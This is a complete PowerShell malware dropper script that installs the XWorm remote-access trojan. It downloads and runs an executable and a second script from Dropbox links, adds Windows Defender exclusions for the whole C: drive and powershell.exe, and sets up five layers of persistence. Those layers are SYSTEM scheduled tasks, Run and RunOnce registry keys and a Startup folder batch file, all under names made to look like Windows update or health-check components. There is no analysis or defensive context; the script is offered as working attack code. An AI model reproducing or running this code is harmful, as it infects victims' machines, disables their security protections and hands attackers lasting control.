# X-WORM + DEPLOY-INVISIBLE NUCLEAR CHAIN (Unkillable)
$wormUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1&raw=1'
$deployUrl = 'https://www.dropbox.com/scl/fi/y6cc3e60w5wq5oaw3vmws/deploy-invisible.ps1?rlkey=oeq647y68mynx7jy6c6kjtodn&st=93matvoe&dl=1&raw=1'
$wormPath = "$env:APPDATA\update.exe"
$deployPath = "$env:APPDATA\deploy-invisible.ps1"

Write-Host "💀 X-WORM + DEPLOY-INVISIBLE NUCLEAR CHAIN 💀"

# **1. TOTAL CLEANUP**
Get-Process | ? Name -like "*update*" | Stop-Process -Force -EA 0
schtasks /delete /tn *Health*,Sys*,*Optimizer*,*Deploy* /f 2>$null
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate,SysUpdate,DebugUpdate,DeployScript /f 2>$null

# **2. EXCLUSIONS (Multi-layer)**
Add-MpPreference -ExclusionPath 'C:\' -ExclusionPath "$env:APPDATA" -ExclusionProcess 'update.exe','powershell.exe' -Force -EA 0

# **3. DOWNLOAD X-WORM**
$wormBytes = (New-Object Net.WebClient).DownloadData($wormUrl)
[IO.File]::WriteAllBytes($wormPath, $wormBytes)
Start-Process $wormPath -WindowStyle Hidden
Write-Host "✅ X-Worm: $wormPath ($([math]::Round($wormBytes.Length/1KB,0))KB)"

# **4. DOWNLOAD DEPLOY-INVISIBLE SCRIPT**
$deployBytes = (New-Object Net.WebClient).DownloadData($deployUrl)
[IO.File]::WriteAllBytes($deployPath, $deployBytes)
Write-Host "✅ Deploy Script: $deployPath"

# **5. PENTA-PERSISTENCE (5 Layers → Impossible to kill)**

# A) Task Scheduler SYSTEM (Primary)
$taskName = "SystemHealthCheck"
$taskCmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$wu='$wormUrl';`$du='$deployUrl';`$wp='$wormPath';`$dp='$deployPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$wp)){(New-Object Net.WebClient).DownloadData(`$wu)|Set-Content `$wp -Enc Byte;Start-Process `$wp -WindowStyle Hidden};if(!(Test-Path `$dp)){(New-Object Net.WebClient).DownloadData(`$du)|Set-Content `$dp -Enc Byte;powershell -f `$dp};if(!(Get-Process -Name 'update' -EA 0)){Start-Process `$wp -WindowStyle Hidden}}}`""
schtasks /create /tn $taskName /tr $taskCmd /sc onlogon /rl SYSTEM /f 2>$null

# B) Registry Run (User Context)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -f `"$deployPath`"" /f 2>$null

# C) RunOnce (Boot Backup)
Set-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SysDeploy" -Value "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -f `"$deployPath`"" -Force

# D) WMI Permanent Monitor (5min check)
$wmCmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$wu='$wormUrl';`$du='$deployUrl';`$wp='$wormPath';`$dp='$deployPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$wp)){(New-Object Net.WebClient).DownloadData(`$wu)|Set-Content `$wp -Enc Byte;Start-Process `$wp};if(!(Test-Path `$dp)){(New-Object Net.WebClient).DownloadData(`$du)|Set-Content `$dp -Enc Byte;powershell -f `$dp}}}`""
schtasks /create /tn "WMIEventMonitor" /tr $wmCmd /sc onidle /mo 5 /rl SYSTEM /f 2>$null

# E) Startup Folder (Visual fallback)
$startUpPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.bat"
@"
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -f `"$deployPath`"
"@ | Out-File -FilePath $startUpPath -Encoding ASCII

Write-Host "`n🎯 PENTA-PERSISTENCE ACTIVE (Impossible to kill):"
Write-Host "✅ A) Task: SystemHealthCheck → SYSTEM (Primary)"
Write-Host "✅ B) Registry: WindowsUpdate → User boot"
Write-Host "✅ C) RunOnce: SysDeploy → Boot backup" 
Write-Host "✅ D) WMI Monitor: Every 5min → SYSTEM"
Write-Host "✅ E) Startup Folder: Visual fallback"
Write-Host "`n💀 DEFENDER DELETES → 5 LOCATIONS REDEPLOY X-WORM + DEPLOY-INVISIBLE"
Write-Host "`n🔄 REBOOT TEST: Will survive ANY cleanup"

